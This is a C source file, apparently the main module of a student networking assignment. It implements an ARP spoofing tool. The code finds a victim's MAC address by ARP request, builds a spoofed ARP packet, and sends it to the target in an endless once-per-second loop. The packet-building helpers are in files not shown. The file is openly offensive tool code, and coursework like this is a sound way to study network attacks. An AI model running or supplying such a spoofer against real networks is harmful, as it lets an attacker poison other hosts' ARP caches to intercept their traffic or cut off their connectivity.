/*
** EPITECH PROJECT, 2019
** NWP_myarpspoof_2018
** File description:
** main
*/

#include <stdio.h>
#include <unistd.h>
#include "my_arp_spoof.h"

static void spoof(sock_t *sock, arg_t *arg, uint8_t *pack, size_t size)
{
    while (1) {
        printf("Spoofed packet sent to '%s'\n", arg->dest_ip);
        sendto(sock->fd, pack, size, 0, (struct sockaddr *)&(sock->dest_arp),
        sizeof(struct sockaddr_ll));
        sleep(1);
    }
}

static void execute(sock_t *sock, arg_t *arg)
{
    uint8_t buf[6] = {0};
    ssize_t tmp;
    uint8_t packet[60] = {0};

    if (arg->print_spoof == false)
        send_arp(sock, arg);
    if (arg->print_broadcast == true)
        return;
    if (arg->print_spoof == false)
        rcv_arp(sock, buf);
    tmp = build_spoofed(sock, packet, arg);
    if (arg->print_spoof == true) {
        print_packet(packet, tmp);
        return;
    }
    printf("Found victim's MAC address: '%02X:%02X:%02X:%02X:%02X:%02X'\n",
    buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
    spoof(sock, arg, packet, tmp);
}

int main(int ac, char **av)
{
    arg_t arg = {0};
    sock_t sock = {0};

    if (parsing(&arg, ac, av) == RETURN_FAILURE) {
        usage(av[0]);
        return (EXIT_FAILURE);
    }
    if (init_socket(&sock, &arg) == RETURN_FAILURE)
        return (EXIT_FAILURE);
    execute(&sock, &arg);
    return (EXIT_SUCCESS);
}